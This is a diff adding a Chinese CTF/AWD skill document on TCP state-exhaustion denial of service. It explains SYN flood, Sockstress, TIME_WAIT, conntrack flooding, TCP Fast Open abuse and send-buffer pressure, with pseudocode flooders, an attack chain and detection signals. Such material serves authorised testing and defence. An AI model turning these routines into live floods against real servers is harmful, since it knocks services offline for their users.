@@ -1,0 +1,397 @@
+# TCP 协议栈状态耗尽
+
+> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/22-dos/06-tcp-state-exhaustion.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
+> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
+> **什么时候用**：命中「见适用信号」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。
+
+## 适用信号
+
+本篇是清单/索引类文档，正文直接以条目给出打点项（见「技术正文」首节）：
+
+- SYN queue (半连接队列)
+- Accept queue (全连接队列)
+- Connection table (全局连接跟踪表)
+- TIME_WAIT slots
+- Socket buffer memory
+- netfilter/conntrack 表项
+- `/proc/net/sockstat` 中 `TCP: inuse` 接近或超过 `tcp_max_orphans`，`TIME_WAIT` 条目 > 50000
+- `ss -s` 显示 `timewait` 或 `syn-recv` 数量异常 (正常 < 1000, 攻击时 > 50000)
+
+## 前置
+
+- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
+- 工具定位走探测层，别猜路径：
+
+```powershell
+. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
+$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
+& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
+```
+
+- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
+- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
+- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：
+
+| 工具 | 本机状态 | 本机命令 / 替代方案 |
+|---|---|---|
+| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
+| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
+| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
+| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
+| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
+| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
+| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
+| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
+| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
+| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
+| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
+| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
+| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
+| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
+| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
+| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
+| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
+| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
+| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
+| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
+| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
+| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
+| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
+| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |
+
+- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
+  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。
+
+
+## 步骤
+
+本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：
+
+1. 方法 1: SYN Flood 及现代变种
+2. 经典 SYN Flood
+3. SYN Cookie 绕过 — Sockstress
+4. 伪代码: SYN Flood + 真实 IP 混合
+5. 方法 2: TIME_WAIT 耗尽
+6. 反向 TIME_WAIT 攻击
+7. 伪代码
+8. 方法 3: Conntrack 表耗尽
+9. 伪代码: Conntrack 洪泛
+10. 方法 4: TCP Fast Open 滥用
+11. 方法 5: Socket Buffer 内存压力
+
+## 判据
+
+判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。
+
+- **输入信号** — `/proc/net/sockstat` 中 `TCP: inuse` 接近或超过 `tcp_max_orphans`，`TIME_WAIT` 条目 > 50000
+- **输入信号** — `ss -s` 显示 `timewait` 或 `syn-recv` 数量异常 (正常 < 1000, 攻击时 > 50000)
+- **输入信号** — 半连接队列溢出计数器递增: `netstat -s | grep "SYNs to LISTEN"`
+- **输入信号** — `nf_conntrack_count` 接近 `nf_conntrack_max` → 新连接被 `nf_conntrack: table full` 丢弃
+- **输入信号** — 内核日志 `dmesg` 出现 `TCP: Possible SYN flooding on port 443` 或 `Dropping request`
+- **输入信号** — 合法用户连接被 `Connection refused` 或 `Connection timeout`，但服务器本身无 CPU 升高
+- **输入信号** — `netstat -ant` 中大量 `SYN_RECV` / `TIME_WAIT` / `CLOSE_WAIT` 状态连接
+- **输入信号** — SYN Cookie 被激活 (正常不应触发)，`/proc/sys/net/ipv4/tcp_syncookies` 统计递增
+- **Evidence** — 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
+- **Evidence** — 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
+- **Evidence** — 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
+- **Evidence** — 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+
+## 坑
+
+- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
+- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
+- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。
+
+## 相关
+
+- 见本技能 `../../SKILL.md` 的 references 索引。
+
+## 技术正文
+
+> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。
+
+## 场景
+
+TCP 是有状态协议，每次握手/连接都在内核中分配数据结构。攻击者利用 TCP 状态机的特性，以极小代价消耗内核的 socket buffer、connection table 或 TIME_WAIT 槽位，使服务器无法接受新连接。
+
+```
+攻击面:
+  - SYN queue (半连接队列)
+  - Accept queue (全连接队列)  
+  - Connection table (全局连接跟踪表)
+  - TIME_WAIT slots
+  - Socket buffer memory
+  - netfilter/conntrack 表项
+```
+
+## 输入信号
+
+- `/proc/net/sockstat` 中 `TCP: inuse` 接近或超过 `tcp_max_orphans`，`TIME_WAIT` 条目 > 50000
+- `ss -s` 显示 `timewait` 或 `syn-recv` 数量异常 (正常 < 1000, 攻击时 > 50000)
+- 半连接队列溢出计数器递增: `netstat -s | grep "SYNs to LISTEN"`
+- `nf_conntrack_count` 接近 `nf_conntrack_max` → 新连接被 `nf_conntrack: table full` 丢弃
+- 内核日志 `dmesg` 出现 `TCP: Possible SYN flooding on port 443` 或 `Dropping request`
+- 合法用户连接被 `Connection refused` 或 `Connection timeout`，但服务器本身无 CPU 升高
+- `netstat -ant` 中大量 `SYN_RECV` / `TIME_WAIT` / `CLOSE_WAIT` 状态连接
+- SYN Cookie 被激活 (正常不应触发)，`/proc/sys/net/ipv4/tcp_syncookies` 统计递增
+
+---
+
+## 方法 1: SYN Flood 及现代变种
+
+### 经典 SYN Flood
+
+```
+攻击者 → TCP SYN (伪造源 IP) → 服务器
+服务器 → TCP SYN-ACK → 伪造 IP (无响应)
+服务器 → SYN_RCVD 状态, 重传 SYN-ACK 最多 5 次
+       半连接队列槽位被占 → 队列满 → 新 SYN 被丢弃
+
+带宽: 每 SYN 约 60 bytes
+100 Mbps → 约 200,000 SYN/s
+默认半连接队列: /proc/sys/net/ipv4/tcp_max_syn_backlog = 512 (旧)/4096 (新)
+```
+
+### SYN Cookie 绕过 — Sockstress
+
+```
+SYN Cookie 解决了半连接队列耗尽，但 Sockstress 攻击全连接:
+
+攻击者完成三次握手 (真实 IP)
+→ 进入 ESTABLISHED 状态
+→ 设置极小的 TCP window (0 或 1 byte)
+→ 服务器不能发送数据 (等待 window update)
+→ 连接永久占用 accept queue 槽 + socket buffer
+
+持久性: 单连接可维持数小时 (TCP keepalive 默认 2 小时)
+```
+
+### 伪代码: SYN Flood + 真实 IP 混合
+
+```
+function syn_flood_hybrid(target, port=443, syn_rate=50000, 
+                          legit_rate=1000, duration_sec=120):
+    raw_sock = create_raw_socket()
+    tcp_socks = []
+    
+    # 并行执行
+    parallel:
+        # 线程1: 伪造 SYN flood (消耗半连接队列)
+        thread:
+            deadline = now() + duration_sec
+            while now() < deadline:
+                for batch in 1..(syn_rate / 100):
+                    src_ip = random_public_ip()
+                    syn_pkt = build_syn_packet(
+                        src_ip=src_ip, dst=target, dst_port=port,
+                        seq=random_u32(),
+                        window=65535,
+                        options=[MSS(1460), SACK_OK, TIMESTAMP]
+                    )
+                    raw_sock.send(syn_pkt)
+                sleep(0.01)  # 控制速率
+        
+        # 线程2: 真实连接占满 accept queue
+        thread:
+            for i in 0..(legit_rate * duration_sec):
+                sock = tcp_connect(target, port)
+                # 三次握手完成
+                # 但立刻将接收窗口设为 0
+                sock.setsockopt(SO_RCVBUF, 0)
+                # 不发任何数据，不发 FIN
+                tcp_socks.append(sock)
+                sleep(1 / legit_rate)
+    
+    # 攻击效果
+    # 半连接队列 + 全连接队列 双满
+    # 新连接无法建立
+```
+
+## 方法 2: TIME_WAIT 耗尽
+
+### 原理
+
+每次 TCP 连接关闭时，主动关闭方进入 TIME_WAIT 状态 (默认 60-120 秒)。期间该四元组 (src_ip, src_port, dst_ip, dst_port) 不可重用。攻击者从真实 IP 主动发起并主动关闭大量连接，耗尽本地端口或对端 TIME_WAIT 槽。
+
+```
+攻击者机器:
+  可用源端口: 65535 - 1024 = 64511
+  TIME_WAIT 持续时间: 60 秒 (Linux net.ipv4.tcp_fin_timeout)
+  
+  最大出连接速率: 64511 / 60s ≈ 1075 conn/s
+  → 超过此速率 → 本地端口耗尽 → 攻击者自己不能建新连接
+  
+  解决方案: 使用多源 IP 或多攻击机
+```
+
+### 反向 TIME_WAIT 攻击
+
+```
+攻击者为服务器制造大量 TIME_WAIT 连接:
+
+  攻击者 ↔ 服务器: 建立连接 → 短暂交换 → 攻击者主动 FIN
+  → 服务器的连接进入 TIME_WAIT
+  → 每个 TIME_WAIT 占用约 200 bytes 内存 + conntrack 条目
+  → 大量 TIME_WAIT → 内存压力 + conntrack 表满
+  → conntrack 满 → 新连接被 netfilter 丢弃
+```
+
+### 伪代码
+
+```
+function reverse_timewait_attack(target, port=80, rate=5000, duration=120):
+    # 快速建立-关闭连接，使服务器积累 TIME_WAIT
+    for i in 0 .. (rate * duration):
+        sock = tcp_connect(target, port)
+        sock.send("GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n")
+        # 不等完整响应
+        sock.shutdown(SHUT_WR)  # 发起 FIN
+        sock.close()  # 本地进入 TIME_WAIT 但马上重用 socket
+        
+        if i % 1000 == 0:
+            server_tw = ssh_exec(target, 
+                "ss -tan state time-wait | wc -l")
+            print("[*] Server TIME_WAIT: {server_tw}")
+```
+
+## 方法 3: Conntrack 表耗尽
+
+### 原理
+
+Linux netfilter 的 conntrack 表跟踪所有连接。攻击者发送大量短连接或无效包，消耗 conntrack 条目。
+
+```
+conntrack 默认值:
+  /proc/sys/net/netfilter/nf_conntrack_max: 65536 (典型)
+  每项内存: ~300 bytes
+  总内存: ~20 MB (不大，但连接跟踪能力有限)
+  
+攻击: 65536 个条目后，新连接被丢弃或不经 NAT
+```
+
+### 伪代码: Conntrack 洪泛
+
+```
+function conntrack_exhaust(target, rate=10000, duration=120):
+    # 方法1: 大量短连接
+    for i in 0 .. (rate * duration):
+        # 每个连接创建新 conntrack 条目
+        sock = tcp_connect(target, random_port(1, 65535))
+        sock.close()
+    
+    # 方法2: 伪造包触发 conntrack 创建
+    # 即使目标端口关闭，conntrack 仍记录该"连接尝试"
+    raw = create_raw_socket()
+    for i in 0 .. (rate * duration * 10):
+        src_ip = random_public_ip()
+        src_port = random_port(1024, 65535)
+        dst_port = random_port(1, 65535)
+        
+        syn = build_syn_packet(src_ip, src_port, target, dst_port)
+        raw.send(syn)
+    
+    # 效果: conntrack 表满 → 
+    #   NAT 不能创建新条目 → 内网不能访问外网
+    #   防火墙可能 drop 所有新连接
+```
+
+## 方法 4: TCP Fast Open 滥用
+
+### 原理
+
+TFO (TCP Fast Open) 允许在 SYN 中携带数据。攻击者滥用此特性进行放大或状态耗尽：
+
+```
+1. TFO Cookie 请求风暴:
+   攻击者发送大量带 TFO 选项的 SYN
+   服务器为每个生成 cookie (需密钥 + HMAC 计算)
+   → CPU 消耗
+
+2. TFO 反射放大:
+   攻击者伪造源 IP 发送 TFO SYN + 数据
+   服务器响应 SYN-ACK + 数据 (比攻击者发送的更大)
+   → 类似 UDP 放大
+
+3. TFO 数据累积:
+   发送带大量数据的 TFO SYN
+   即使三次握手未完成，服务器已经分配 buffer 接收数据
+```
+
+## 方法 5: Socket Buffer 内存压力
+
+### 原理
+
+每个 TCP 连接分配读写缓冲区。攻击者发送数据但不确认 (zero window)，迫使服务器缓冲数据：
+
+```
+攻击:
+  建立连接 → 服务器发送响应 → 攻击者通告 zero window
+  → 服务器数据堆积在 send buffer
+  → 每个连接可占用 tcp_wmem 默认最大 4MB (Linux)
+  → 100 个连接 ≈ 400MB 内存
+  → 1000 个连接 ≈ 4GB → 触发 OOM
+```
+
+### 伪代码
+
+```
+function tcp_buffer_pressure(target, port=80, connections=500):
+    socks = []
+    
+    for i in 0 .. connections:
+        sock = tcp_connect(target, port)
+        # 请求一个大资源
+        sock.send("GET /large-file HTTP/1.1\r\nHost: {target}\r\n\r\n")
+        
+        # 读取响应头但不读 body
+        # 或者通告 zero window
+        sock.setsockopt(SO_RCVBUF, 0)  # 通告 win=0
+        
+        socks.append(sock)
+    
+    # 服务器每个连接 send buffer 堆积数据
+    # 内存持续增长直到 OOM 或 TCP 超时 (默认 15 分钟)
+    
+    # 保持连接存活
+    while True:
+        for sock in socks[::50]:  # 每 50 个发 1 次探活
+            try:
+                sock.send(b"\x00")  # TCP keep-alive probe
+            except:
+                pass
+        sleep(30)
+```
+
+## 攻击链
+
+```
+发现:
+  1. nmap 扫描 TCP 开放端口
+  2. 确认 conntrack 限制 (通过逐渐增加连接数检测)
+  3. 确认 TIME_WAIT 配置 (FIN 后测量 TIME_WAIT 恢复时间)
+
+攻击:
+  4. SYN flood + Sockstress 混合 → 半连接 + 全连接双满
+  5. 叠加 conntrack 洪泛 → 绕过 syn cookie 的限制
+  6. 叠加 buffer pressure → 消耗剩余内存
+```
+
+## 参考资料
+
+1. CVE-1999-0116 — Classic SYN flood (first documented)
+2. CVE-2011-1473 — OpenSSL renegotiation DoS (related TLS attack)
+3. RFC 4987 — TCP SYN Flooding Attacks and Common Mitigations
+4. BCP38 / RFC 2827 — Network Ingress Filtering
+5. "Sockstress" — Outpost24, 2008 (TCP window zero attack)
+6. CVE-2022-32293 — TCP Middlebox Reflection (AWS NLB / F5 BIG-IP)
+7. RFC 7413 — TCP Fast Open
+8. "net.ipv4.tcp_syncookies" — Linux kernel SYN cookie documentation
+9. "conntrack: table full" — Linux netfilter troubleshooting guide
+10. "A study of Slow-rate DoS Attacks against Network Services" — Maciá-Fernández et al., 2010
+
+## Evidence
+
+- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
+- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
+- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
+- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
